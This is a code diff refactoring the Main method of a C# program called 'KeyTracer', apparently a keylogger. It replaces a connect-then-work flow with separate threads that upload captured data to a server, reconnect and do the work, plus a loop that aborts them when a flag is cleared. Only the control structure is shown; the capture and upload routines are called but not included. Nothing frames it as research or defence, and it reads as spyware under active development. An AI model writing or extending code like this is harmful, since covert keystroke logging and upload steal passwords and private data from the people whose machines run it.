@@ -9,46 +9,27 @@ namespace KeyTracer
 {
     class Program
     {
-        static bool connected = false;
-
         static void Main(string[] args)
         {
             StartUp.Configure();
 
-            if (Internet.Connect() == 1)
-                connected = true;
+            Thread uploadWork = new Thread(new ThreadStart(Threads.UplaodWork));
+            uploadWork.Start();
 
-            if (connected)
-            {
-                Thread work = new Thread(new ThreadStart(DoWork));
-                work.Start();
-            }
-            else
-            {
-                Thread retry = new Thread(new ThreadStart(Reconnect));
-            }
+            Thread reConnect = new Thread(new ThreadStart(Threads.Reconnect));
+            reConnect.Start();
+
+            Thread work = new Thread(new ThreadStart(Threads.DoWork));
+            work.Start();
 
             while (true)
             {
-                Listener.Listen();
-            }
-        }
+                Thread.Sleep(Consts.matchDelayTime);
 
-        private static void DoWork()
-        {
-            if (connected)
-            {
-                Thread.Sleep(Consts.uploadDelay);
-                Server.Upload();
-            }
-        }
-
-        private static void Reconnect()
-        {
-            if (!connected)
-            {
-                Thread.Sleep(Consts.serverTimeout);
-                Internet.Connect();
+                if (!Consts.doWork)
+                {
+                    Threads.AbortThreads(work, uploadWork, reConnect);
+                }
             }
         }
     }
